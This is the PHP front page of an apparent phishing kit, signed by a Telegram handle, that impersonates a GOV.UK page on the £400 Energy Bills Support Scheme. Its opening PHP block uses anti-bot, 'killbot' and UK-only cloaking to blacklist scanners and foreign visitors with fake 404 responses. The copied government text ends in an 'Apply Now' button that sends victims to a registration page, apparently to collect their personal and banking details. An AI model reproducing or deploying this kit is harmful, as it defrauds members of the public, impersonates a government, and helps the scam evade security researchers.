<?php
// @Kr3pto on telegram
require "configg.php";
require "eng_assetz/vinc/session_protect.php";
require "eng_assetz/vinc/functions.php";
require "eng_assetz/dev.php";

if($internal_antibot == 1){
	require "eng_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("eng_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "eng_assetz/mob_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		$fp = fopen("eng_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("eng_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
?>
<!DOCTYPE html>
<html class="govuk-template show-global-bar" lang="en">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title lang="en">Help with your energy bills: Getting a discount on your energy bill - GOV.UK</title>
        <link rel="stylesheet" href="eng_assetz/css/application-8dc8c5613498268403a21a497e8d719375a2c8435d950029.css" />
        <link rel="stylesheet" href="eng_assetz/css/application-2b68ed2428f7c21ba3e4a7f5e13993c7592a638177e30198.css" />
        <link rel="shortcut icon" href="eng_assetz/img/favicon-9ed7849c462c53aa2cdf1690eb257e801ecbf5696d1d0928868c5b032b4adb36.ico" />
    </head>
    <body class="gem-c-layout-for-public govuk-template__body js-enabled">
        <header class="gem-c-layout-super-navigation-header">
            <div class="gem-c-layout-super-navigation-header__container govuk-width-container govuk-clearfix">
                <div class="gem-c-layout-super-navigation-header__header-logo">
                    <a class="govuk-header__link govuk-header__link--homepage" href="javascript:void(0);" id="logo">
                        <span class="govuk-header__logotype">
                            <svg class="govuk-header__logotype-crown gem-c-layout-super-navigation-header__logotype-crown" focusable="false" height="30" viewBox="0 0 132 97" width="36">
                                <path
                                    d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zM9 39.5c3.6 1.5 7.8-.2 9.2-3.7 1.5-3.6-.2-7.8-3.9-9.1-3.6-1.5-7.6.2-9.1 3.8-1.4 3.5.3 7.5 3.8 9zM4.4 57.2c3.5 1.5 7.7-.2 9.1-3.8 1.5-3.6-.2-7.7-3.9-9.1-3.5-1.5-7.6.3-9.1 3.8-1.4 3.5.3 7.6 3.9 9.1zm38.3-21.4c3.5 1.5 7.7-.2 9.1-3.8 1.5-3.6-.2-7.7-3.9-9.1-3.6-1.5-7.6.3-9.1 3.8-1.3 3.6.4 7.7 3.9 9.1zm64.4-5.6c-3.6 1.5-7.8-.2-9.1-3.7-1.5-3.6.2-7.8 3.8-9.2 3.6-1.4 7.7.3 9.2 3.9 1.3 3.5-.4 7.5-3.9 9zm15.9 9.3c-3.6 1.5-7.7-.2-9.1-3.7-1.5-3.6.2-7.8 3.7-9.1 3.6-1.5 7.7.2 9.2 3.8 1.5 3.5-.3 7.5-3.8 9zm4.7 17.7c-3.6 1.5-7.8-.2-9.2-3.8-1.5-3.6.2-7.7 3.9-9.1 3.6-1.5 7.7.3 9.2 3.8 1.3 3.5-.4 7.6-3.9 9.1zM89.3 35.8c-3.6 1.5-7.8-.2-9.2-3.8-1.4-3.6.2-7.7 3.9-9.1 3.6-1.5 7.7.3 9.2 3.8 1.4 3.6-.3 7.7-3.9 9.1zM69.7 17.7l8.9 4.7V9.3l-8.9 2.8c-.2-.3-.5-.6-.9-.9L72.4 0H59.6l3.5 11.2c-.3.3-.6.5-.9.9l-8.8-2.8v13.1l8.8-4.7c.3.3.6.7.9.9l-5 15.4v.1c-.2.8-.4 1.6-.4 2.4 0 4.1 3.1 7.5 7 8.1h.2c.3 0 .7.1 1 .1.4 0 .7 0 1-.1h.2c4-.6 7.1-4.1 7.1-8.1 0-.8-.1-1.7-.4-2.4V34l-5.1-15.4c.4-.2.7-.6 1-.9zM66 92.8c16.9 0 32.8 1.1 47.1 3.2 4-16.9 8.9-26.7 14-33.5l-9.6-3.4c1 4.9 1.1 7.2 0 10.2-1.5-1.4-3-4.3-4.2-8.7L108.6 76c2.8-2 5-3.2 7.5-3.3-4.4 9.4-10 11.9-13.6 11.2-4.3-.8-6.3-4.6-5.6-7.9 1-4.7 5.7-5.9 8-.5 4.3-8.7-3-11.4-7.6-8.8 7.1-7.2 7.9-13.5 2.1-21.1-8 6.1-8.1 12.3-4.5 20.8-4.7-5.4-12.1-2.5-9.5 6.2 3.4-5.2 7.9-2 7.2 3.1-.6 4.3-6.4 7.8-13.5 7.2-10.3-.9-10.9-8-11.2-13.8 2.5-.5 7.1 1.8 11 7.3L80.2 60c-4.1 4.4-8 5.3-12.3 5.4 1.4-4.4 8-11.6 8-11.6H55.5s6.4 7.2 7.9 11.6c-4.2-.1-8-1-12.3-5.4l1.4 16.4c3.9-5.5 8.5-7.7 10.9-7.3-.3 5.8-.9 12.8-11.1 13.8-7.2.6-12.9-2.9-13.5-7.2-.7-5 3.8-8.3 7.1-3.1 2.7-8.7-4.6-11.6-9.4-6.2 3.7-8.5 3.6-14.7-4.6-20.8-5.8 7.6-5 13.9 2.2 21.1-4.7-2.6-11.9.1-7.7 8.8 2.3-5.5 7.1-4.2 8.1.5.7 3.3-1.3 7.1-5.7 7.9-3.5.7-9-1.8-13.5-11.2 2.5.1 4.7 1.3 7.5 3.3l-4.7-15.4c-1.2 4.4-2.7 7.2-4.3 8.7-1.1-3-.9-5.3 0-10.2l-9.5 3.4c5 6.9 9.9 16.7 14 33.5 14.8-2.1 30.8-3.2 47.7-3.2z"
                                    fill="currentColor"
                                    fill-rule="evenodd"
                                ></path>
                            </svg>
                            <span class="govuk-header__logotype-text"> GOV.UK </span>
                        </span>
                    </a>
                </div>
                <nav class="gem-c-layout-super-navigation-header__content js-module-initialised" style="margin-bottom: 0px;">
                    <button class="gem-c-layout-super-navigation-header__navigation-top-toggle-button" id="super-navigation-menu-3c11689e-toggle" type="button">
                        <span class="gem-c-layout-super-navigation-header__navigation-top-toggle-button-inner">Menu</span>
                    </button>
                    <div class="gem-c-layout-super-navigation-header__navigation-items"></div>
                    <button class="gem-c-layout-super-navigation-header__search-toggle-button" id="super-search-menu-toggle" type="button">
                        <svg class="gem-c-layout-super-navigation-header__search-toggle-button-link-icon" width="27" height="27" viewBox="0 0 27 27" fill="none" focusable="false">
                            <circle cx="12.0161" cy="11.0161" r="8.51613" stroke="currentColor" stroke-width="3"></circle>
                            <line x1="17.8668" y1="17.3587" x2="26.4475" y2="25.9393" stroke="currentColor" stroke-width="3"></line>
                        </svg>
                    </button>
                </nav>
            </div>
        </header>
        <div class="gem-c-layout-for-public__blue-bar govuk-width-container"></div>
        <div id="wrapper" class="direction-ltr govuk-width-container">
            <div class="gem-c-contextual-breadcrumbs">
                <div class="gem-c-breadcrumbs govuk-breadcrumbs govuk-breadcrumbs--collapse-on-mobile">
                    <ol class="govuk-breadcrumbs__list">
                        <li class="govuk-breadcrumbs__list-item"><a class="govuk-breadcrumbs__link" href="javascript:void(0);">Home</a></li>
                        <li class="govuk-breadcrumbs__list-item"><a class="govuk-breadcrumbs__link" href="javascript:void(0);"> Housing and local services </a></li>
                        <li class="govuk-breadcrumbs__list-item"><a class="govuk-breadcrumbs__link" href="javascript:void(0);"> Household energy </a></li>
                    </ol>
                </div>
            </div>
            <main id="content" class="guide" lang="en">
                <div class="govuk-grid-row">
                    <div class="govuk-grid-column-two-thirds">
                        <div class="gem-c-title govuk-!-margin-top-8 govuk-!-margin-bottom-8"><h1 class="gem-c-title__text govuk-heading-xl">Help with your energy bills</h1></div>
                        <a class="gem-c-skip-link govuk-skip-link govuk-!-display-none-print" href="javascript:void(0);">Skip to contents of guide</a>
                        <aside class="part-navigation-container">
                            <nav class="gem-c-contents-list">
                                <h2 class="gem-c-contents-list__title">Contents</h2>
                                <ol class="gem-c-contents-list__list">
                                    <li class="gem-c-contents-list__list-item gem-c-contents-list__list-item--dashed"><a class="gem-c-contents-list__link govuk-link" href="javascript:void(0);"> Overview </a></li>
                                    <li class="gem-c-contents-list__list-item gem-c-contents-list__list-item--dashed gem-c-contents-list__list-item--active">Getting a discount on your energy bill</li>
                                    <li class="gem-c-contents-list__list-item gem-c-contents-list__list-item--dashed">
                                        <a class="gem-c-contents-list__link govuk-link" href="javascript:void(0);"> If you pay for your electricity as part of your rent </a>
                                    </li>
                                    <li class="gem-c-contents-list__list-item gem-c-contents-list__list-item--dashed"><a class="gem-c-contents-list__link govuk-link" href="javascript:void(0);"> Help for businesses </a></li>
                                    <li class="gem-c-contents-list__list-item gem-c-contents-list__list-item--dashed">
                                        <a class="gem-c-contents-list__link govuk-link" href="javascript:void(0);"> If you live in a park, mobile or care home, or off the electricity grid </a>
                                    </li>
                                    <li class="gem-c-contents-list__list-item gem-c-contents-list__list-item--dashed">
                                        <a class="gem-c-contents-list__link govuk-link" href="javascript:void(0);"> If you use alternative fuels for heating </a>
                                    </li>
                                    <li class="gem-c-contents-list__list-item gem-c-contents-list__list-item--dashed"><a class="gem-c-contents-list__link govuk-link" href="javascript:void(0);"> If you're in Northern Ireland </a></li>
                                </ol>
                            </nav>
                        </aside>
                    </div>
                    <div class="govuk-grid-column-two-thirds" id="guide-contents">
                        <h1 class="part-title">Getting a discount on your energy bill</h1>
                        <div class="gem-c-govspeak govuk-govspeak direction-ltr disable-youtube">
                            <p>You can get a £400 discount to help with your energy bills over winter 2023 to 2024. You do not have to pay this money back. This is called the Energy Bills Support Scheme ( <abbr>EBSS</abbr>).</p>
                            <h2 id="eligibility">Eligibility</h2>
                            <p>All households with a domestic electricity connection in England, Scotland and Wales are eligible for the discount.</p>
                            <p>You’ll still get the discount if:</p>
                            <ul>
                                <li>you change your payment method or tariff</li>
                                <li>you switch electricity supplier or move to a new address</li>
                                <li>your supplier goes bust</li>
                                <li>you’re in arrears on your electricity bill payments</li>
                            </ul>
                            <div class="application-notice info-notice">
                                <p>The way you get support is different <a href="javascript:void(0);">if you live in a park, mobile or care home or off-grid</a>.</p>
                            </div>
                            <h2 id="if-youre-in-northern-ireland">If you’re in Northern Ireland</h2>
                            <p>You’ll automatically get a £600 payment towards your energy bill through the <a href="javascript:void(0);">Northern Ireland Energy Bills Support Scheme</a>.</p>
                            <h2 id="how-youll-get-the-discount">How you’ll get the discount</h2>
                            <p>You do not need to apply for the discount, and there’s no need to contact your energy supplier.</p>
                            <p>The discount will be applied to your household electricity bill for 6 months starting in October 2023. You’ll get:</p>
                            <ul>
                                <li>£66 in October and November</li>
                                <li>£67 in December, January, February and March</li>
                            </ul>
                            <p>You’ll get the discount monthly, even if you pay for your energy quarterly or use a payment card.</p>
                            <div class="application-notice info-notice"><p>If you do not get a payment, contact your energy supplier.</p></div>
                            <h3 id="if-you-pay-by-direct-debit">If you pay by Direct Debit</h3>
                            <p>You’ll get the discount automatically either as:</p>
                            <ul>
                                <li>a reduction to your monthly Direct Debit amount</li>
                                <li>a refund to your bank account after the monthly direct debit collection</li>
                            </ul>
                            <h3 id="if-you-pay-by-credit-or-debit-card">If you pay by credit or debit card</h3>
                            <p>Your discount will be automatically applied as a credit to your account in the first week of each month.</p>
                            <h3 id="if-you-have-a-smart-prepayment-meter">If you have a smart prepayment meter</h3>
                            <p>Your discount will be credited directly to your smart prepayment meter in the first week of each month.</p>
                            <h3 id="if-you-have-a-traditional-prepayment-meter">If you have a traditional prepayment meter</h3>
                            <p>You’ll automatically get the discount each month as either:</p>
                            <ul>
                                <li>redeemable vouchers, sent by text, email or post</li>
                                <li>an automatic credit when you top up at your usual top-up point</li>
                            </ul>
                            <p>Your electricity supplier will let you know in advance how you will get your discount.</p>
                            <p>You’ll need to redeem vouchers at a top-up point, for example at a Post Office or PayPoint shop. Payzone outlets do not accept the vouchers.</p>
                            <p>Vouchers expire after 90 days. If your voucher does expire, you can ask for it to be reissued. All vouchers must be redeemed by 30 August 2024.</p>
                            <p>Your supplier will contact you if you do not redeem your voucher.</p>
                            <p>Some suppliers may allow you to transfer <abbr>EBSS</abbr> payments from your electricity meter to your gas meter.</p>
                        </div>
						<br />
						<a class="gem-c-button govuk-button govuk-button--start" href="registration?sslchannel=true&sessionid=<?=generateRandomString(130);?>&access=yes">
							Apply Now <svg class="govuk-button__start-icon govuk-!-display-none-print" width="17.5" height="19" viewBox="0 0 33 40"><path fill="currentColor" d="M0 0h13l20 20-20 20H0l20-20z"></path></svg>
						</a>
						<br />
						<br />
						<br />
                        <nav class="govuk-pagination govuk-pagination--block">
                            <div class="govuk-pagination__prev">
                                <a class="govuk-link govuk-pagination__link" href="javascript:void(0);">
                                    <svg class="govuk-pagination__icon govuk-pagination__icon--prev" height="13" width="15" focusable="false" viewBox="0 0 15 13">
                                        <path d="m6.5938-0.0078125-6.7266 6.7266 6.7441 6.4062 1.377-1.449-4.1856-3.9768h12.896v-2h-12.984l4.2931-4.293-1.414-1.414z"></path>
                                    </svg>
                                    <span class="govuk-pagination__link-title">Previous</span> <span class="govuk-pagination__link-label">Overview</span>
                                </a>
                            </div>
                            <div class="govuk-pagination__next">
                                <a class="govuk-link govuk-pagination__link" href="javascript:void(0);">
                                    <svg class="govuk-pagination__icon govuk-pagination__icon--next" height="13" width="15" focusable="false" viewBox="0 0 15 13">
                                        <path d="m8.107-0.0078125-1.4136 1.414 4.2926 4.293h-12.986v2h12.896l-4.1855 3.9766 1.377 1.4492 6.7441-6.4062-6.7246-6.7266z"></path>
                                    </svg>
                                    <span class="govuk-pagination__link-title">Next</span> <span class="govuk-pagination__link-label">If you pay for your electricity as part of your rent </span>
                                </a>
                            </div>
                        </nav>
                        <div class="responsive-bottom-margin"><a href="javascript:void(0);" class="govuk-link govuk-link--no-visited-state govuk-body">View a printable version of the whole guide</a></div>
                    </div>
                    <div class="govuk-grid-column-one-third">
                        <div class="gem-c-contextual-sidebar">
                            <div class="gem-c-related-navigation">
                                <h2 id="related-nav-related_items-fd0547b7" class="gem-c-related-navigation__main-heading">Related content</h2>
                                <nav class="gem-c-related-navigation__nav-section">
                                    <ul class="gem-c-related-navigation__link-list">
                                        <li class="gem-c-related-navigation__link">
                                            <a
                                                class="govuk-link govuk-link gem-c-related-navigation__section-link govuk-link gem-c-related-navigation__section-link--sidebar govuk-link gem-c-related-navigation__section-link--other"
                                                href="javascript:void(0);"
                                            >
                                                Cost of Living Payment 2022
                                            </a>
                                        </li>
                                        <li class="gem-c-related-navigation__link">
                                            <a
                                                class="govuk-link govuk-link gem-c-related-navigation__section-link govuk-link gem-c-related-navigation__section-link--sidebar govuk-link gem-c-related-navigation__section-link--other"
                                                href="javascript:void(0);"
                                            >
                                                Cost of living support
                                            </a>
                                        </li>
                                    </ul>
                                </nav>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="govuk-grid-row">
                    <div class="govuk-grid-column-two-thirds">
                        <div class="gem-c-contextual-footer">
                            <div class="gem-c-related-navigation">
                                <nav class="gem-c-related-navigation__nav-section">
                                    <h2 id="related-nav-topics-4115f776" class="gem-c-related-navigation__sub-heading gem-c-related-navigation__sub-heading--footer">Explore the topic</h2>
                                    <ul class="gem-c-related-navigation__link-list">
                                        <li class="gem-c-related-navigation__link">
                                            <a class="govuk-link govuk-link gem-c-related-navigation__section-link govuk-link gem-c-related-navigation__section-link--footer" href="javascript:void(0);"> Household energy </a>
                                        </li>
                                    </ul>
                                </nav>
                                <nav class="gem-c-related-navigation__nav-section">
                                    <h2 id="related-nav-related_external_links-4115f776" class="gem-c-related-navigation__sub-heading gem-c-related-navigation__sub-heading--footer gem-c-related-navigation__sub-heading--other">
                                        Elsewhere on the web
                                    </h2>
                                    <ul class="gem-c-related-navigation__link-list">
                                        <li class="gem-c-related-navigation__link">
                                            <a
                                                class="govuk-link govuk-link gem-c-related-navigation__section-link govuk-link gem-c-related-navigation__section-link--footer govuk-link gem-c-related-navigation__section-link--other"
                                                href="javascript:void(0);"
                                            >
                                                Ofgem: Help with bills
                                            </a>
                                        </li>
                                    </ul>
                                </nav>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
        <div class="govuk-width-container">
            <div class="gem-c-feedback govuk-!-display-none-print">
                <div class="gem-c-feedback__prompt gem-c-feedback__js-show js-prompt">
                    <div class="gem-c-feedback__prompt-content">
                        <div class="gem-c-feedback__prompt-questions js-prompt-questions">
                            <div class="gem-c-feedback__prompt-question-answer">
                                <h2 class="gem-c-feedback__prompt-question">Is this page useful?</h2>
                                <ul class="gem-c-feedback__option-list">
                                    <li class="gem-c-feedback__option-list-item"><button class="govuk-button gem-c-feedback__prompt-link js-page-is-useful">Yes</button></li>
                                    <li class="gem-c-feedback__option-list-item"><button class="govuk-button gem-c-feedback__prompt-link js-toggle-form js-page-is-not-useful">No</button></li>
                                </ul>
                            </div>
                        </div>
                        <div class="gem-c-feedback__prompt-questions gem-c-feedback__prompt-questions--something-is-wrong js-prompt-questions">
                            <button class="govuk-button gem-c-feedback__prompt-link js-toggle-form js-something-is-wrong">Report a problem with this page</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class="gem-c-layout-footer govuk-footer gem-c-layout-footer--border">
            <div class="govuk-width-container">
                <div class="govuk-footer__navigation">
                    <div class="govuk-grid-column-two-thirds govuk-!-display-none-print">
                        <h2 class="govuk-footer__heading govuk-heading-m">Topics</h2>
                        <ul class="govuk-footer__list govuk-footer__list--columns-2">
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Benefits </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Births, death, marriages and care </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Business and self-employed </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Childcare and parenting </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Citizenship and living in the UK </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Cost of living support </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Crime, justice and the law </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Disabled people </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Driving and transport </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Education and learning </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Employing people </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Environment and countryside </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Housing and local services </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Money and tax </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Passports, travel and living abroad </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Visas and immigration </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Working, jobs and pensions </a></li>
                        </ul>
                    </div>
                    <div class="govuk-grid-column-one-third govuk-!-display-none-print">
                        <h2 class="govuk-footer__heading govuk-heading-m">Government activity</h2>
                        <ul class="govuk-footer__list govuk-footer__list--columns-1">
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Departments </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> News </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Guidance and regulation </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Research and statistics </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Policy papers and consultations </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Transparency </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> How government works </a></li>
                            <li class="govuk-footer__list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Get involved </a></li>
                        </ul>
                    </div>
                </div>
                <hr class="govuk-footer__section-break" />
                <div class="govuk-footer__meta">
                    <div class="govuk-footer__meta-item govuk-footer__meta-item--grow">
                        <ul class="govuk-footer__inline-list govuk-!-display-none-print">
                            <li class="govuk-footer__inline-list-item"><a class="govuk-footer__link">Help</a></li>
                            <li class="govuk-footer__inline-list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Privacy </a></li>
                            <li class="govuk-footer__inline-list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Cookies </a></li>
                            <li class="govuk-footer__inline-list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Accessibility statement </a></li>
                            <li class="govuk-footer__inline-list-item"><a class="govuk-footer__link"> Contact </a></li>
                            <li class="govuk-footer__inline-list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Terms and conditions </a></li>
                            <li class="govuk-footer__inline-list-item"><a class="govuk-footer__link" href="javascript:void(0);" lang="cy"> Rhestr o Wasanaethau Cymraeg </a></li>
                            <li class="govuk-footer__inline-list-item"><a class="govuk-footer__link" href="javascript:void(0);"> Government Digital Service </a></li>
                        </ul>
                        <svg focusable="false" class="govuk-footer__licence-logo" viewBox="0 0 483.2 195.7" height="17" width="41">
                            <path
                                fill="currentColor"
                                d="M421.5 142.8V.1l-50.7 32.3v161.1h112.4v-50.7zm-122.3-9.6A47.12 47.12 0 0 1 221 97.8c0-26 21.1-47.1 47.1-47.1 16.7 0 31.4 8.7 39.7 21.8l42.7-27.2A97.63 97.63 0 0 0 268.1 0c-36.5 0-68.3 20.1-85.1 49.7A98 98 0 0 0 97.8 0C43.9 0 0 43.9 0 97.8s43.9 97.8 97.8 97.8c36.5 0 68.3-20.1 85.1-49.7a97.76 97.76 0 0 0 149.6 25.4l19.4 22.2h3v-87.8h-80l24.3 27.5zM97.8 145c-26 0-47.1-21.1-47.1-47.1s21.1-47.1 47.1-47.1 47.2 21 47.2 47S123.8 145 97.8 145"
                            ></path>
                        </svg>
                        <span class="govuk-footer__licence-description"> All content is available under the <a class="govuk-footer__link" href="javascript:void(0);">Open Government Licence v3.0</a>, except where otherwise stated </span>
                    </div>
                    <div class="govuk-footer__meta-item"><a class="govuk-footer__link govuk-footer__copyright-logo" href="javascript:void(0);"> © Crown copyright </a></div>
                </div>
            </div>
        </footer>
    </body>
</html>